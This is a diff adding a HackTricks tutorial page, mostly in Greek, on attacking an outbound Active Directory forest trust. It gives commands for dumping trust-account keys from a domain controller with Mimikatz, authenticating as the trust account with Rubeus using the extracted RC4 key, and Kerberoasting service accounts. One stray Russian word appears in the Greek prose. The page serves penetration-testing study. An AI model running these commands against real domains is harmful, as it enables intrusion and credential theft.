@@ -1,0 +1,99 @@
+# External Forest Domain - One-Way (Outbound)
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
+
+Σε αυτό το σενάριο **το domain σας** **εμπιστεύεται** κάποιες **privileges** σε κύριους από **διαφορετικά domains**.
+
+## Enumeration
+
+### Outbound Trust
+```powershell
+# Notice Outbound trust
+Get-DomainTrust
+SourceName      : root.local
+TargetName      : ext.local
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Outbound
+WhenCreated     : 2/19/2021 10:15:24 PM
+WhenChanged     : 2/19/2021 10:15:24 PM
+
+# Lets find the current domain group giving permissions to the external domain
+Get-DomainForeignGroupMember
+GroupDomain             : root.local
+GroupName               : External Users
+GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
+MemberDomain            : root.io
+MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
+MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
+## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
+```
+## Trust Account Attack
+
+Μια ευπάθεια ασφαλείας υπάρχει όταν μια σχέση εμπιστοσύνης καθορίζεται μεταξύ δύο τομέων, που αναγνωρίζονται εδώ ως τομέας **A** και τομέας **B**, όπου ο τομέας **B** επεκτείνει την εμπιστοσύνη του στον τομέα **A**. Σε αυτή τη ρύθμιση, δημιουργείται ένας ειδικός λογαριασμός στον τομέα **A** για τον τομέα **B**, ο οποίος παίζει κρίσιμο ρόλο στη διαδικασία πιστοποίησης μεταξύ των δύο τομέων. Αυτός ο λογαριασμός, που σχετίζεται με τον τομέα **B**, χρησιμοποιείται για την κρυπτογράφηση εισιτηρίων για την πρόσβαση σε υπηρεσίες μεταξύ των τομέων.
+
+Η κρίσιμη πτυχή που πρέπει να κατανοηθεί εδώ είναι ότι ο κωδικός πρόσβασης και το hash αυτού του ειδικού λογαριασμού μπορούν να εξαχθούν από έναν Domain Controller στον τομέα **A** χρησιμοποιώντας ένα εργαλείο γραμμής εντολών. Η εντολή για την εκτέλεση αυτής της ενέργειας είναι:
+```powershell
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
+```
+Αυτή η εξαγωγή είναι δυνατή επειδή ο λογαριασμός, που αναγνωρίζεται με ένα **$** μετά το όνομά του, είναι ενεργός και ανήκει στην ομάδα "Domain Users" του τομέα **A**, κληρονομώντας έτσι τις άδειες που σχετίζονται με αυτήν την ομάδα. Αυτό επιτρέπει σε άτομα να πιστοποιούνται κατά του τομέα **A** χρησιμοποιώντας τα διαπιστευτήρια αυτού του λογαριασμού.
+
+**Προειδοποίηση:** Είναι εφικτό να εκμεταλλευτεί κανείς αυτή την κατάσταση για να αποκτήσει πρόσβαση στον τομέα **A** ως χρήστης, αν και με περιορισμένες άδειες. Ωστόσο, αυτή η πρόσβαση είναι επαρκής για να εκτελέσει καταμέτρηση στον τομέα **A**.
+
+Σε ένα σενάριο όπου το `ext.local` είναι ο τομέας εμπιστοσύνης και το `root.local` είναι ο εμπιστευμένος τομέας, θα δημιουργηθεί ένας λογαριασμός χρήστη με το όνομα `EXT$` εντός του `root.local`. Μέσω συγκεκριμένων εργαλείων, είναι δυνατόν να εκφορτωθούν τα κλειδιά εμπιστοσύνης Kerberos, αποκαλύπτοντας τα διαπιστευτήρια του `EXT$` στο `root.local`. Η εντολή για να επιτευχθεί αυτό είναι:
+```bash
+lsadump::trust /patch
+```
+Ακολουθώντας αυτό, θα μπορούσε να χρησιμοποιήσει το εξαγόμενο κλειδί RC4 για να πιστοποιηθεί ως `root.local\EXT$` εντός του `root.local` χρησιμοποιώντας μια άλλη εντολή εργαλείου:
+```bash
+.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
+```
+Αυτό το βήμα αυθεντικοποίησης ανοίγει τη δυνατότητα να καταμετρήσουμε και ακόμη και να εκμεταλλευτούμε υπηρεσίες εντός του `root.local`, όπως η εκτέλεση μιας επίθεσης Kerberoast για την εξαγωγή διαπιστευτηρίων λογαριασμού υπηρεσίας χρησιμοποιώντας:
+```bash
+.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
+```
+### Συλλογή καθαρού κωδικού εμπιστοσύνης
+
+Στην προηγούμενη ροή χρησιμοποιήθηκε το hash εμπιστοσύνης αντί για τον **καθαρό κωδικό** (ο οποίος επίσης **dumped από το mimikatz**).
+
+Ο καθαρός κωδικός μπορεί να αποκτηθεί μετατρέποντας την έξοδο \[ CLEAR ] από το mimikatz από δεκαεξαδικό και αφαιρώντας τα null bytes ‘\x00’:
+
+![](<../../.gitbook/assets/image (938).png>)
+
+Μερικές φορές, κατά τη δημιουργία μιας σχέσης εμπιστοσύνης, ένας κωδικός πρέπει να πληκτρολογηθεί από τον χρήστη για την εμπιστοσύνη. Σε αυτή τη демонстрация, το κλειδί είναι ο αρχικός κωδικός εμπιστοσύνης και επομένως αναγνώσιμο από άνθρωπο. Καθώς το κλειδί κυκλώνει (30 ημέρες), ο καθαρός κωδικός δεν θα είναι αναγνώσιμος από άνθρωπο αλλά τεχνικά θα είναι ακόμα χρήσιμος.
+
+Ο καθαρός κωδικός μπορεί να χρησιμοποιηθεί για κανονική αυθεντικοποίηση ως ο λογαριασμός εμπιστοσύνης, μια εναλλακτική λύση για την αίτηση ενός TGT χρησιμοποιώντας το μυστικό κλειδί Kerberos του λογαριασμού εμπιστοσύνης. Εδώ, ερωτώντας το root.local από το ext.local για μέλη των Domain Admins:
+
+![](<../../.gitbook/assets/image (792).png>)
+
+## Αναφορές
+
+* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
